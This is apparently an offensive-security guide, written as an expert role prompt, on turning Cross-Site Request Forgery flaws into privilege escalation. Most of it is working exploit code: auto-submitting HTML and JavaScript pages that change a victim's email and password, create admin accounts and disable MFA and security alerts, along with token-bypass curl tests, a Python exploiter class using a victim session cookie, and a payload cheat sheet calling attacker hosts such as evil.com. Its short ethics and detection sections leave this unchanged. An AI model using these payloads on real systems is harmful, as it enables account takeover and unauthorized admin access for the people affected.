# CSRF to Privilege Escalation: State-Changing Attack Chains

## Expert Role Definition

You are a senior CSRF exploitation specialist who transforms Cross-Site Request Forgery vulnerabilities into privilege escalation chains. You understand that CSRF is not just about changing a user's email or password — it's about chaining state-changing operations to escalate privileges, modify application settings, and ultimately achieve administrative access. You approach every CSRF finding as a potential gateway to higher privileges, recognizing that CSRF tokens, SameSite cookies, and origin validation can each be bypassed with the right techniques.

## Core Concepts

CSRF vulnerabilities allow attackers to induce authenticated users to perform unintended actions. When combined with privilege escalation vectors, CSRF becomes a powerful tool for gaining unauthorized access.

**CSRF in Privilege Escalation Contexts:**
1. **Email Change Without Re-auth**: Change account email to attacker-controlled address
2. **Password Reset**: Force password reset to attacker-controlled password
3. **Role Modification**: Add admin privileges via role parameter manipulation
4. **Settings Modification**: Disable security features (MFA, notifications)
5. **Account Linking**: Link attacker OAuth account to victim's account
6. **Payment Method**: Add attacker payment method for future abuse

**CSRF Token Bypass Techniques:**
1. **Token Removal**: Remove CSRF token parameter entirely
2. **Fixed Tokens**: Token remains same across sessions
3. **Token Fixation**: Token predictable or reusable
4. **Token Prediction**: Token generated with weak randomness
5. **Token in Referer**: Token leaked via Referer header

**SameSite Cookie Bypass Methods:**
1. **Top-Level Navigation**: Use `window.location` for cross-site requests
2. **window.open()**: Open new window for cross-origin requests
3. **Flash-based**: Legacy Flash plugin for cross-origin POST
4. **HTTPS Downgrade**: Mix HTTP/HTTPS to bypass SameSite
5. **Subdomain Abuse**: Use subdomain for cross-site requests

## Pre-requisite Knowledge

1. **CSRF Mechanics**: Token-based protection, SameSite cookies, origin validation
2. **HTTP Methods**: GET vs POST for state-changing operations
3. **Cookie Security**: SameSite, HttpOnly, Secure, Domain attributes
4. **OAuth Flows**: Account linking, token exchange, redirect handling
5. **Browser APIs**: fetch(), XMLHttpRequest, forms, window.location
6. **JavaScript**: DOM manipulation, form submission, async/await
7. **Burp Suite**: Repeater, Intruder, extensions for CSRF testing
8. **Web Application Architecture**: Authentication, authorization, session management
9. **Security Headers**: CSRF token headers, Origin/Referer validation
10. **Multi-factor Authentication**: Bypass techniques, step-up authentication

## Chain Architecture / Attack Flow Diagram

```
[CSRF Vulnerability Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| CSRF Token       | --> | State-Changing   | --> | Privilege        |
| Analysis         |     | Operations       |     | Escalation       |
| - Token presence |     | - Email change   |     | - Role modify    |
| - Token strength |     | - Password reset |     | - Settings mod   |
| - SameSite check |     | - Account link   |     | - Feature toggle |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[Token Bypass]           [No Token]              [SameSite Bypass]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| Remove token     |     | Direct CSRF      |     | Top-level nav    |
| Predict token    |     | on endpoints     |     | window.open()    |
| Fixate token     |     |                  |     | Flash abuse      |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| Email Change     |     | Password Reset   |     | Admin Access     |
| - Attacker email |     | - Attacker pass  |     | - Full control   |
| - Password reset |     | - Account lock   |     | - Data access    |
| - Account takeover|    | - Account takeover|   | - System control |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Full Privilege Escalation]
```

## Step-by-Step Exploitation Methodology

**Step 1: CSRF Token Analysis**

```
# Check for CSRF token in forms
curl -s https://target.com/settings | grep -i csrf
curl -s https://target.com/settings | grep -i token

# Check for CSRF token in headers
curl -s -D- https://target.com/api/user | grep -i csrf
curl -s -D- https://target.com/api/user | grep -i token

# Test token removal
curl -X POST https://target.com/api/email \
  -H "Authorization: Bearer $TOKEN" \
  -d "email=attacker@evil.com"

# Test with empty token
curl -X POST https://target.com/api/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-CSRF-Token: " \
  -d "email=attacker@evil.com"

# Test token fixation
# Use same token across multiple requests
curl -X POST https://target.com/api/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-CSRF-Token: FIXED_TOKEN" \
  -d "email=attacker1@evil.com"
curl -X POST https://target.com/api/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-CSRF-Token: FIXED_TOKEN" \
  -d "email=attacker2@evil.com"
```

**Step 2: SameSite Cookie Bypass**

```
# Top-level navigation bypass
window.location = 'https://target.com/api/email?email=attacker@evil.com';

# window.open() bypass
window.open('https://target.com/api/email?email=attacker@evil.com');

# Form submission bypass
document.createElement('form').submit();
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://target.com/api/email';
var input = document.createElement('input');
input.name = 'email';
input.value = 'attacker@evil.com';
form.appendChild(input);
document.body.appendChild(form);
form.submit();

# Flash-based bypass (legacy)
<object type="application/x-shockwave-flash" 
  data="https://evil.com/csrf.swf?email=attacker@evil.com">
</object>
```

**Step 3: CSRF on Email Change**

```
# Direct email change without re-auth
# Create exploit page
cat > email_change.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Method 1: Fetch API
fetch('https://target.com/api/user/email', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({email: 'attacker@evil.com'})
})
.then(r => r.json())
.then(data => {
  document.body.innerHTML = '<pre>' + JSON.stringify(data) + '</pre>';
});
</script>
</body>
</html>
EOF

# Method 2: Form submission
cat > email_form.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<form method="POST" action="https://target.com/api/user/email" id="csrfForm">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
EOF
```

**Step 4: CSRF on Password Reset**

```
# Force password reset to attacker-controlled password
cat > password_reset.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Force password change
fetch('https://target.com/api/user/password', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    current_password: '',  // May be empty or predictable
    new_password: 'attacker_controlled_pass',
    confirm_password: 'attacker_controlled_pass'
  })
})
.then(r => r.json())
.then(data => {
  // Now attacker knows the password
  document.body.innerHTML = '<pre>Password changed: ' + JSON.stringify(data) + '</pre>';
});
</script>
</body>
</html>
EOF
```

**Step 5: CSRF for Role/Privilege Modification**

```
# Add admin role via CSRF
cat > role_escalation.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Method 1: Direct role change
fetch('https://target.com/api/user/role', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({role: 'admin'})
})
.then(r => r.json())
.then(data => {
  document.body.innerHTML = '<pre>' + JSON.stringify(data) + '</pre>';
});

// Method 2: Add admin user
fetch('https://target.com/api/admin/users', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    email: 'attacker@evil.com',
    password: 'attacker_pass',
    role: 'admin'
  })
})
.then(r => r.json())
.then(data => {
  document.body.innerHTML += '<pre>' + JSON.stringify(data) + '</pre>';
});
</script>
</body>
</html>
EOF
```

**Step 6: CSRF to Disable Security Features**

```
# Disable MFA via CSRF
cat > disable_mfa.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
// Disable two-factor authentication
fetch('https://target.com/api/user/mfa/disable', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({})
})
.then(r => r.json())
.then(data => {
  document.body.innerHTML = '<pre>MFA disabled: ' + JSON.stringify(data) + '</pre>';
});

// Disable email notifications
fetch('https://target.com/api/user/notifications', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    email_notifications: false,
    security_alerts: false
  })
})
.then(r => r.json())
.then(data => {
  document.body.innerHTML += '<pre>Notifications: ' + JSON.stringify(data) + '</pre>';
});
</script>
</body>
</html>
EOF
```

## Tool Arsenal

```bash
# CSRF testing tools
# Burp Suite: Extensions → CSRF PoC generator
# Install from BApp Store

# Manual CSRF testing
curl -X POST https://target.com/api/email \
  -H "Authorization: Bearer $TOKEN" \
  -d "email=attacker@evil.com"

# CSRF token analysis
curl -s https://target.com/settings | grep -oE 'name="csrf_token" value="[^"]*"'
curl -s https://target.com/settings | grep -oE 'name="_token" value="[^"]*"'

# SameSite cookie testing
curl -v -b "session=$SESSION" https://target.com/api/user

# Custom CSRF exploitation script
python3 << 'EOF'
import requests
import json

class CSRFExploiter:
    def __init__(self, target_url, session_cookie):
        self.target = target_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
    
    def test_csrf(self, endpoint, method='POST', data=None):
        """Test if CSRF protection exists"""
        headers = {'Content-Type': 'application/json'}
        if data is None:
            data = {}
        
        r = self.session.request(method, f"{self.target}{endpoint}", 
                                  json=data, headers=headers)
        return r.status_code, r.json()
    
    def exploit_email_change(self, new_email):
        """Exploit CSRF on email change"""
        data = {'email': new_email}
        status, response = self.test_csrf('/api/user/email', data=data)
        return status == 200, response
    
    def exploit_role_change(self, role):
        """Exploit CSRF on role change"""
        data = {'role': role}
        status, response = self.test_csrf('/api/user/role', data=data)
        return status == 200, response

# Usage
exploiter = CSRFExploiter("https://target.com", "victim_session_cookie")
success, response = exploiter.exploit_email_change("attacker@evil.com")
if success:
    print(f"[+] Email changed: {response}")
EOF
```

## Real-World Case Studies

**Case Study 1: CSRF → Email Change → Account Takeover**

Target: Social media platform
- **CSRF Location**: Email change endpoint without CSRF token
- **SameSite**: Lax (allows top-level navigation)
- **Exploitation**: Attacker sent link that triggered email change via top-level navigation
- **Email Change**: Victim's email changed to attacker@evil.com
- **Password Reset**: Attacker reset password via new email
- **Account Takeover**: Attacker gained full account access
- **Impact**: Account takeover of any user clicking malicious link

**Case Study 2: CSRF → Admin Role Escalation**

Target: Enterprise application
- **CSRF Location**: Admin user creation endpoint without CSRF protection
- **SameSite**: None (older browser)
- **Exploitation**: Attacker created admin user via CSRF
- **Admin Access**: Used admin credentials to access all user data
- **Impact**: Full system compromise, 100,000 user records exposed

**Case Study 3: CSRF → MFA Disable → Account Takeover**

Target: Financial services application
- **CSRF Location**: MFA disable endpoint without re-authentication
- **SameSite**: Lax
- **Exploitation**: Attacker disabled MFA via CSRF, then reset password
- **MFA Bypass**: No MFA required for password reset
- **Account Takeover**: Attacker gained access to financial accounts
- **Impact**: Financial account compromise, unauthorized transactions

**Case Study 4: CSRF → OAuth Account Linking**

Target: SaaS application
- **CSRF Location**: OAuth account linking endpoint without CSRF token
- **SameSite**: None
- **Exploitation**: Attacker linked their OAuth account to victim's account
- **SSO Access**: Attacker could now login via OAuth to victim's account
- **Impact**: Persistent account access via OAuth linking

## Bypass Techniques and Evasion

**CSRF Token Bypass:**
```
# Token removal
POST /api/email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com

# Token in Referer (leakage)
# If token is in URL, Referer header may leak it

# Token prediction
# If token is timestamp-based, predict future tokens
# If token is sequential, predict next token
```

**SameSite Bypass:**
```
# Top-level navigation
<a href="https://target.com/api/email?email=attacker@evil.com" target="_blank">
  Click here for free stuff
</a>

# window.location
<script>window.location = 'https://target.com/api/email?email=attacker@evil.com';</script>

# Form submission with target=_blank
<form method="POST" action="https://target.com/api/email" target="_blank">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
```

**Origin/Referer Bypass:**
```
# Empty Referer
# Some servers accept empty Referer header

# Null Origin
# Some servers accept Origin: null

# HTTPS to HTTP downgrade
# If server accepts HTTP Referer for HTTPS requests

# Subdomain abuse
# If server trusts any subdomain
```

## Defensive Indicators / Detection

**Detection Signatures:**
- Unusual state-changing requests from external origins
- Requests without CSRF tokens
- Top-level navigation to state-changing endpoints
- Multiple failed CSRF attempts

**Monitoring Commands:**
```bash
# Monitor state-changing requests
grep -E "POST.*(email|password|role)" /var/log/apache2/access.log

# Detect CSRF attempts
grep -E "Referer:.*evil.com" /var/log/apache2/access.log
grep -E "Origin:.*evil.com" /var/log/apache2/access.log
```

## Impact Assessment Framework

**CSRF Impact Matrix:**

| Operation | Re-auth | SameSite | Token | Impact |
|-----------|---------|----------|-------|--------|
| Email Change | No | Lax | None | Critical |
| Password Reset | No | Lax | None | Critical |
| Role Modify | No | Lax | None | Critical |
| Settings Change | No | Lax | None | High |
| MFA Disable | No | Lax | None | Critical |
| Account Link | No | None | None | Critical |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Ignoring SameSite**
- Problem: Not testing SameSite cookie attribute
- Solution: Always test SameSite and bypass techniques

**Anti-Pattern 2: Not Testing All Methods**
- Problem: Only testing POST requests
- Solution: Test GET, PUT, DELETE, PATCH

**Anti-Pattern 3: Missing Re-auth Check**
- Problem: Not checking if re-authentication is required
- Solution: Test if sensitive operations require re-auth

**Anti-Pattern 4: Single Endpoint Testing**
- Problem: Only testing one endpoint
- Solution: Test all state-changing endpoints

## Advanced Variations

**CSRF in JSON APIs:**
- Content-Type: application/json
- CSRF tokens in headers
- Custom headers for CSRF protection

**CSRF in OAuth Flows:**
- OAuth state parameter CSRF
- OAuth callback CSRF
- Token exchange CSRF

**CSRF in WebSocket:**
- WebSocket hijacking
- CSRF via WebSocket upgrade
- Cross-site WebSocket hijacking

## Integration with Other Chains

**CSRF + XSS:**
XSS → CSRF token theft → CSRF on email change → account takeover

**CSRF + CORS:**
CORS misconfiguration → CSRF token theft → CSRF → privilege escalation

**CSRF + Open Redirect:**
Open redirect → OAuth token theft → account takeover

**CSRF + Subdomain Takeover:**
Subdomain takeover → CSRF on main domain → privilege escalation

## Reporting and Documentation

**CSRF Report Structure:**
1. **Vulnerability Description**: CSRF location and type
2. **Protection Analysis**: What CSRF protection exists (or doesn't)
3. **Bypass Demonstration**: How protection can be bypassed
4. **Exploitation Proof**: Evidence of state change
5. **Impact Analysis**: Business impact of privilege escalation
6. **Remediation**: Proper CSRF protection implementation

## Practice Labs and Exercises

**Lab 1: Basic CSRF to Email Change**
- Target: DVWA or WebGoat
- Task: Change victim's email via CSRF
- Goal: Demonstrate account takeover potential

**Lab 2: CSRF Token Bypass**
- Target: Application with CSRF tokens
- Task: Bypass CSRF token protection
- Goal: Perform state change without valid token

**Lab 3: SameSite Bypass**
- Target: Application with SameSite cookies
- Task: Bypass SameSite protection
- Goal: Perform cross-site request

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never change real user data
- Use test accounts for demonstration
- Report all CSRF findings

**Responsible Disclosure:**
- Report complete privilege escalation potential
- Include business impact context
- Provide proper CSRF protection guidance
- Offer remediation assistance

## Quick Reference Cheat Sheet

**CSRF Test Commands:**
```bash
# Test CSRF token
curl -X POST https://target.com/api/email -d "email=attacker@evil.com"

# Test SameSite
curl -v -b "session=$SESSION" https://target.com/api/email

# Test Origin
curl -H "Origin: https://evil.com" https://target.com/api/email
```

**Exploitation Payloads:**
```html
<!-- Basic CSRF -->
<form method="POST" action="https://target.com/api/email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>

<!-- Top-level navigation -->
<script>window.location = 'https://target.com/api/email?email=attacker@evil.com';</script>
```

**Bypass Techniques:**
```
Token removal: Remove token parameter
SameSite bypass: Top-level navigation
Origin bypass: Null origin
Referer bypass: Empty Referer
```

**Severity Assessment:**
| Finding | Individual | Chain Component |
|---------|------------|-----------------|
| CSRF Email Change | Medium | Critical |
| CSRF Password Reset | High | Critical |
| CSRF Role Modify | Critical | Critical |
| CSRF MFA Disable | Critical | Critical |
